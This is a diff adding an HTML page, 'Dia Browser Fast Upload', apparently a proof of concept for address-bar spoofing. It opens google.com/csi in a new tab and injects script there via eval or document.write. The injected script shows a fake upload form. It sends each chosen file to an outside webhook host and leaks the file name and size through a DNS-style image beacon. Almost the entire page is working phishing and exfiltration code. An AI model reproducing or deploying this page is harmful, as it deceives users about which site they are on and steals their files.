@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>diabrowser.com</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      height: 100vh;
+      background: #000;
+      color: #fff;
+      font-family: system-ui, -apple-system, sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      text-align: center;
+    }
+    h1 {
+      font-size: 3rem;
+      margin-bottom: 1.5rem;
+      color: #00ff88;
+    }
+    p {
+      font-size: 1.3rem;
+      margin: 0 1.5rem 2rem;
+      max-width: 700px;
+      line-height: 1.6;
+    }
+    button {
+      padding: 18px 50px;
+      font-size: 1.8rem;
+      background: #00ff88;
+      color: #000;
+      border: none;
+      border-radius: 12px;
+      cursor: pointer;
+      box-shadow: 0 10px 40px rgba(0,255,136,0.4);
+      transition: all 0.3s;
+    }
+    button:hover {
+      background: #00e676;
+      transform: scale(1.05);
+    }
+    #previewContainer {
+      margin-top: 3rem;
+      width: 90%;
+      max-width: 700px;
+      border: 3px dashed #00ff88;
+      border-radius: 16px;
+      padding: 1.5rem;
+      background: rgba(0,255,136,0.05);
+    }
+    #preview {
+      max-width: 100%;
+      max-height: 500px;
+      border-radius: 12px;
+      display: none;
+    }
+    .hint {
+      margin-top: 2rem;
+      font-size: 1.1rem;
+      color: #aaa;
+      opacity: 0.8;
+    }
+  </style>
+</head>
+<body>
+  <h1>Dia Browser Fast Upload</h1>
+  
+  <p>
+    Klik tombol di bawah ini untuk membuka uploader cepat.<br>
+    File akan diupload ke server kami secara otomatis.
+  </p>
+
+  <button onclick="spoofAndInject()">Upload File Sekarang</button>
+
+  <div id="previewContainer">
+    <img id="preview" alt="Preview file yang diupload">
+  </div>
+
+  <p class="hint">
+    Tab baru akan terbuka dengan address bar google.com/csi dan form upload langsung muncul.
+  </p>
+
+  <script>
+    const OOB = "https://keen-unicorn-32.webhook.cool";
+
+    function spoofAndInject() {
+      // Buka tab baru dengan domain target asli (address bar spoof)
+      const targetTab = window.open("https://www.google.com/csi", "_blank");
+
+      if (!targetTab) {
+        alert("Popup diblokir. Izinkan popup untuk situs ini.");
+        return;
+      }
+
+      // Tunggu tab load, lalu inject script via postMessage atau bookmarklet-style
+      const injectScript = `
+        (function() {
+          // Buat form upload
+          const container = document.createElement('div');
+          container.style.position = 'fixed';
+          container.style.top = '50%';
+          container.style.left = '50%';
+          container.style.transform = 'translate(-50%, -50%)';
+          container.style.background = 'white';
+          container.style.padding = '40px';
+          container.style.borderRadius = '12px';
+          container.style.boxShadow = '0 4px 20px rgba(0,0,0,0.3)';
+          container.style.zIndex = '999999';
+          container.style.maxWidth = '500px';
+          container.style.textAlign = 'center';
+
+          container.innerHTML = \`
+            <h1>Upload File</h1>
+            <p>Pilih file untuk upload cepat</p>
+            <input type="file" id="fileInput" accept="image/*,video/*,.pdf" />
+            <div id="preview" style="margin-top:20px; max-width:100%; max-height:300px; display:none;"></div>
+          \`;
+
+          document.body.appendChild(container);
+
+          const fileInput = container.querySelector('#fileInput');
+          const preview = container.querySelector('#preview');
+
+          fileInput.onchange = async function(e) {
+            const file = e.target.files[0];
+            if (file) {
+              const reader = new FileReader();
+              reader.onload = function(event) {
+                preview.src = event.target.result;
+                preview.style.display = 'block';
+              };
+              reader.readAsDataURL(file);
+
+              // Exfil ke webhook OOB
+              const formData = new FormData();
+              formData.append('file', file, file.name);
+              fetch('${OOB}/upload', {
+                method: 'POST',
+                body: formData
+              }).catch(err => console.log('Exfil failed:', err));
+
+              // OOB DNS beacon
+              const beacon = btoa(file.name + '_' + file.size).replace(/=/g, '').substring(0, 500);
+              new Image().src = 'https://' + beacon + '.${OOB}';
+            }
+          };
+        })();
+      `;
+
+      // Inject script via bookmarklet-style (lebih reliable daripada document.write)
+      setTimeout(() => {
+        if (targetTab && !targetTab.closed) {
+          try {
+            targetTab.eval(injectScript);
+          } catch (e) {
+            console.warn("Eval injection failed:", e);
+            // Fallback: coba document.write kalau eval diblok
+            targetTab.document.open();
+            targetTab.document.write(`
+              <script>${injectScript}<\/script>
+            `);
+            targetTab.document.close();
+          }
+        }
+      }, 800); // Delay cukup untuk tab load
+    }
+  </script>
+</body>
+</html>
